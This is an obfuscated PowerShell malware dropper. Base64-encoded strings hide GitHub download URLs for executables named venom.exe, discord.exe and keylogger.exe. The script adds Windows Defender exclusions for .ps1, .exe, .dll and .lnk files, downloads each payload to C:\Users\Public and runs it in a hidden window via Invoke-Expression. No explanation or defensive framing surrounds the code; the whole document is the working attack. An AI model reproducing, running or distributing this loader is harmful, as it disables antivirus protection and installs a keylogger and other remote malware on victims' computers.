$z1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9naXRodWIuY29tL2hhY2t5aXRwcm8vbWFpbi9yYXcvcmVmcy9oZWFkcy9tYWluL3Zlbm9tLmV4ZQ=='));$z2 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9naXRodWIuY29tL2hhY2t5aXRwcm8vbWFpbi9yYXcvcmVmcy9oZWFkcy9tYWluL2Rpc2NvcmQuZXhl'));$z3 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9naXRodWIuY29tL2hhY2t5aXRwcm8vbWFpbi9yYXcvcmVmcy9oZWFkcy9tYWluL2tleWxvZ2dlci5leGU='));$p1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcVXNlcnNcUHVibGljXHZlbm9tLmV4ZQ=='));$p2 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcVXNlcnNcUHVibGljXGtleWxvZ2dlci5leGU='));$x1 = '.ps1';$x2 = '.exe';$x3 = '.dll';$x4 = '.lnk';$c1 = 'Add-MpPreference';$c2 = 'iwr';$c3 = 'powershell.exe';$r = Get-Random;function x9q7z {param($a)$b = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($a));return $b};if($env:OS -eq 'Windows_NT'){$k = 0;while($k -lt 2){try{$null = & $c1 -ExclusionExtension $x1,$x2,$x3,$x4; break}catch{$k++}};foreach($u in @($z1,$z2,$z3)){$f = if($u -eq $z3){$p2}else{$p1};$cmd = "$c2 -uri $u -o $f";Invoke-Expression $cmd;$cmd2 = "$c3 -w Hidden $f";Invoke-Expression $cmd2}}